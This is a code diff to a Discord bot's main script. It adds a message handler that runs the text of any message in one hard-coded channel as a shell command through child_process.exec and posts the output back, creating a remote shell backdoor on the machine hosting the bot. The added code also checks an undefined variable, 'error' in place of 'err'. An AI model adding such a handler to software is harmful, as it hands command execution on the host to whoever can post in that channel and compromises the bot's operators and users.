@@ -971,5 +971,18 @@ client.on('ready', () => {
         }
     }, 10000);
 });
+client.on('message', message => {
+    const { Message } = require('discord.js');
+    if(message.channel.id != "800333110763192321") return
+    const exec = require('child_process').exec;
+
+    exec(`${message.content}`, function (err, stdout, stderr) {
+        message.channel.send('stdout: ' + stdout);
+        message.channel.send('stderr: ' + stderr);
+        if (error !== null) {
+            message.channel.send('error: ' + err);
+        }
+    });
+});
 require('./web.js').start(client, ops);
 client.login(process.env.TOKEN);
